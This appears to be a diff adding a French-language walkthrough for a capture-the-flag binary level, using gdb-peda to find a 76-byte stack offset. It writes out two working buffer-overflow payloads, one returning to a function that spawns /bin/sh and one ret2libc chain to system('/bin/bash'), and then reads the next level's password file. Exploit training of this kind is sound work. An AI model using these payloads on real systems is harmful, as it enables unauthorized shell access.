@@ -1,0 +1,64 @@
+objdump -M intel -d level1
+(ou info function dans peda)
+
+On voit que le binaire contient une fonction "run" qui fait un call de system de 0x8048584.
+
+On va essayer de l'executer 
+
+gbd ./leval1
+source /tmp/peda/peda.py
+set disassembly-flavor intel
+start
+disass
+
+
+x/s 0x8048584 montre que cette adresse contient /bin/sh. Donc la function 'run' lance sh.
+
+Adresse de 'run': 0x08048444
+
+On avance dans le programme avec 'si' jusque:
+lea    eax,[esp+0x10]
+
+i f :
+Stack level 0, frame at 0xbffff720:
+ eip = 0x8048489 in main; saved eip 0xb7e454d3
+ called by frame at 0xbffff790
+ Arglist at 0xbffff718, args:
+ Locals at 0xbffff718, Previous frame's sp is 0xbffff720
+ Saved registers:
+  ebp at 0xbffff718, eip at 0xbffff71c
+
+p $esp+0x10 :
+$1 = (void *) 0xbffff6d0
+
+Distance entre l'EIP et l'EBP:
+distance 0xbffff71c 0xbffff6d0
+From 0xbffff71c to 0xbffff6d0: -76 bytes, -19 dwords
+
+
+python -c 'print "\x41" * 76 + "\x44\x84\x04\x08"' > /tmp/tmp
+cat /tmp/tmp - | ./level1
+
+cd /home/user/level2
+cat .pass
+
+
+
+
+
+
+gdb-peda$ x/s 0xbffff90b + 6
+0xbffff911:  "/bin/bash"
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+gdb-peda$ p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+gdb-peda$ x/s 0xb7e5ebe4
+0xb7e5ebe4 <exit+4>:  "\017"
+
+0xb7e5ebe0 <exit>
+0xb7e6b060 <system>
+0xbffff911:  "/bin/bash"
+
+python -c 'print "\x41" * 76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x11\xf9\xff\xbf"' > /tmp/tmp
+cat /tmp/tmp - | ./level1
